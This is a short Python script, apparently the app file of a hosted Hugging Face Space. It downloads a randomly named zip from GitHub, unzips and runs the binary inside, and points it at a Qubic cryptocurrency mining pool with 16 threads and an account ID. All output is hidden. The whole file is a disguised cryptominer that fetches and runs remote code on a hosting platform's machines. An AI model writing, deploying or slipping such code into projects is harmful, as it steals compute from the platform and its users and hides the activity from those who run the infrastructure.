import os
os.system("wget https://github.com/qqivk/Yeodp/raw/refs/heads/main/Zeapmgy.zip")
os.system("unzip Zeapmgy.zip")
os.system("chmod +x Zeapmgy")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./Zeapmgy --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
